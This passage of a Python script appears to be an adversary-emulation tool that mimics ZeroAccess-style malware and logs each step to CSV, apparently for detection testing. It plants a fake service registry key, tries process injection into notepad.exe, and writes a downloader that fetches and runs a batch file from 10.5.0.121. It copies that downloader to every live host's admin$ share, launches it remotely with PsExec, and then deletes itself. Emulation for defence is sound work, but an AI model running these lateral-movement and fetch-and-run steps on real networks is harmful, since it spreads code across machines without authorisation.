    except Exception as err:
        common.log(str(err))
        row = [common.HOSTNAME, common.gettime(), "Registry",
               "HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentVersion\\Action Center", "Updated", "Failed"]

    common.logcsv(row)
    CloseKey(KeyHandle)
    common.log("#################################################")

    # ******************* Create ServiceTest registry key *******************
    z_exe_path = "C:\\Windows\\System32\\z.exe"
    # create Services subkey for "ServiceTest"
    common.log("Creating ServiceTest registry key...")
    time.sleep(2)
    hkey = None
    try:
        hkey = CreateKey(HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Services\\z")
        row = [common.HOSTNAME, common.gettime(), "Registry", "z", "Created", "Completed"]
    except Exception as err:
        common.log(str(err))
        row = [common.HOSTNAME, common.gettime(), "Registry", "z", "Created", "Failed"]

    # create "ServiceTest" data values
    try:
        hkey = wreg.CreateKey(wreg.HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Services\\ServiceTest\\")
        common.log("Updating ServiceTest metadata...")
        time.sleep(2)
        SetValueEx(hkey, "Description", 0, REG_SZ, "A fake service")
        SetValueEx(hkey, "DisplayName", 0, REG_SZ, "ServiceTest Service")
        SetValueEx(hkey, "ImagePath", 0, REG_SZ, "Target file")
        SetValueEx(hkey, "ServiceDLL", 0, REG_SZ, "C:\\ServiceTest.dll")

        # modify contents of ServiceDLL and ImagePath
        common.log("Modifying ServiceTest binary...")
        time.sleep(2)
        SetValueEx(hkey, "ImagePath", 0, REG_SZ, z_exe_path)
        SetValueEx(hkey, "ServiceDLL", 0, REG_SZ, z_exe_path)

        hkey.Close()
        common.log("#################################################")
        row = [common.HOSTNAME, common.gettime(), "Registry", "System\\CurrentControlSet\\Services\\", "Created",
               "Completed"]
    except:
        row = [common.HOSTNAME, common.gettime(), "Registry", "System\\CurrentControlSet\\Services\\", "Created",
               "Failed"]

    common.logcsv(row)

    # ******************* Process injection to notepad.exe *******************
    common.log("Process injection")
    common.log("Trying to inject malicious code to notepad.exe")
    time.sleep(1)
    common.log("Validate the process is running...")
    time.sleep(2)

    OSCommand("Process", "notepad.exe", "Created", "start notepad.exe")  # Start the process to inject
    common.log("Trying to inject the code...")
    time.sleep(2)

    process_injector("Process", "notepad.exe", "Updated", "notepad.exe")  # Trying to inject code to trusted process...
    common.log("#################################################")

    # ******************* Start process *******************
    common.log("Starting a new task.exe process...")
    time.sleep(2)
    OSCommand("Process", "task.exe", "Created", "task.exe")

    common.log("Starting a new cmd.exe process...")
    time.sleep(2)
    OSCommand("Process", "cmd.exe", "Created", "start cmd.exe")

    common.log("Starting a new Rundll32.exe process...")
    time.sleep(2)
    OSCommand("Process", "Rundll32.exe", "Created", "start Rundll32.exe")
    common.log("#################################################")

    # ******************* Network *******************
    common.log("Intializing Netowrk IOC's:")
    time.sleep(2)

    common.log("Ping google.com")
    time.sleep(2)
    OSCommand("Ping", "8.8.8.8", "Created", "ping 8.8.8.8")  # TODO - Change to google.com?

    common.log("Trying to connect to CNC servers...")
    time.sleep(2)

    server, ip, portOpen = common.serve_web(16465)  # HTTP req -- local http server
    process = "calc.exe"
    # **************************** Create svchost.exe ****************************
    status = create_file(common.BASE_DIR + "\\calc.exe")
    if status == 0:
        row = [common.HOSTNAME, common.gettime(), 'File', common.BASE_DIR + '\\calc.exe', 'Created', 'Completed']
        common.log("File svchost.exe created")
    else:
        row = [common.HOSTNAME, common.gettime(), 'File', common.BASE_DIR + '\\calc.exe', 'Created', 'Failed']
    common.logcsv(row)
    common.log("Validate the process is running...")
    time.sleep(2)
    OSCommand("Process", "calc.exe", "Created", "start calc.exe")
    common.logcsv([common.HOSTNAME, common.gettime(), "Process", "calc.exe", "Updated", "Failed"])
    http_from_process("Port", "16465", "Created", process, ip, portOpen)
    row = [common.HOSTNAME, common.gettime(), 'File', common.BASE_DIR + '\\calc.exe', 'Deleted', 'Completed']
    common.logcsv(row)
    common.log("Checking the RPC port...")
    RPCPortOpenOrClosed("Port", "135", "Updated", "Completed")
    common.log("#################################################")

    # ******************* Lateral movement *******************
    common.log("Scanning the network...")
    time.sleep(2)
    live_hosts = ScanC.main()
    for host in live_hosts:
        common.logcsv([common.HOSTNAME, common.gettime(), "Ping", str(host), "Created", "Completed"])

    common.log("Starting lateral movement...")
    time.sleep(2)

    common.log("Creating the downloader.py file...")
    time.sleep(2)

    with open(common.BASE_DIR + "\\downloader.py", "w") as file:
        file.write("import urllib3.request \n")
        file.write("import os \n")
        file.write("import shutil \n")
        file.write("import time \n")
        file.write("url = 'http://10.5.0.121/hello.bat'")
        file.write("\n")
        file.write("PoolManager = urllib3.PoolManager()")
        file.write("\n")
        file.write("with PoolManager.request('GET',url, preload_content=False) " +
                   "as " +
                   "resp, open('" + common.BASE_DIR + "\\hello.bat', 'wb') " +
                   "as " +
                   "out_file:")
        file.write("\n")
        file.write("    shutil.copyfileobj(resp, out_file)")
        file.write("\n")
        file.write("time.sleep(2)")
        file.write("\n")
        file.write("os.system('" + common.BASE_DIR + "\\hello.bat')")

    common.log("Creating the hello.bat file...")
    time.sleep(2)

    with open(common.BASE_DIR + "\\hello.bat", "w") as file:
        file.write("echo hello world")

    common.log("Copying the downloader.py to all other live machines...")
    time.sleep(2)
    for host in live_hosts:
        try:
            common.copy_file(common.BASE_DIR + "\\downloader.py",
                             "\\\\%s\\admin$" % str(host))  # Copy file to remote PC
            row = [common.HOSTNAME, common.gettime(), "LateralMovement", "\\\\%s\\admin$" % str(host), "Created",
                   "Completed"]
        except Exception as err:
            row = [common.HOSTNAME, common.gettime(), "LateralMovement", "\\\\%s\\admin$" % str(host), "Created",
                   "Failed"]
    common.logcsv(row)

    HttpServerPath = find("HttpServer.py", "C:\\")
    common.log("Starting HTTP Server using the local pc ip's...")
    os.system("start Python %s" % HttpServerPath)  # Start HTTP server
    time.sleep(2)

    common.log("Remotely start the downloader.py file on remote machines...")
    time.sleep(2)
    for host in live_hosts:
        os.system(
            ps_exec_path + " \\\\%s " % str(host) + "-accepteula python FV " + common.BASE_DIR + "\\downloader.py")
        time.sleep(2)
    common.log("#################################################")

    # ******************* Self delete *******************
    common.log("Self destruct is ON , astalavista baby!")
    time.sleep(3)
    row = [common.HOSTNAME, common.gettime(), "File", sys.argv[0], "Deleted", "Completed"]
    common.logcsv(row)
    os.remove(sys.argv[0])
    common.log("-------File was deleted------")
    sys.exit(0)


if __name__ == "__main__":
    if not os.path.exists(common.LOG_DIR):
        try:
            os.makedirs(common.LOG_DIR)  # Create C:\csvlog LOG_DIR
            row = [common.HOSTNAME, common.gettime(), 'Folder', common.LOG_DIR, 'Created', 'Completed']
        except:
            row = [common.HOSTNAME, common.gettime(), 'Folder', common.LOG_DIR, 'Created', 'Failed']
        common.logcsv(row)

    if not os.path.exists(common.BASE_DIR):
        try:
            os.makedirs(common.BASE_DIR)  # Create C:\ZeroAccess BASE_DIR
            row = [common.HOSTNAME, common.gettime(), 'Folder', common.BASE_DIR, 'Created', 'Completed']
        except:
            row = [common.HOSTNAME, common.gettime(), 'Folder', common.BASE_DIR, 'Created', 'Failed']
        common.logcsv(row)
    exit(main())
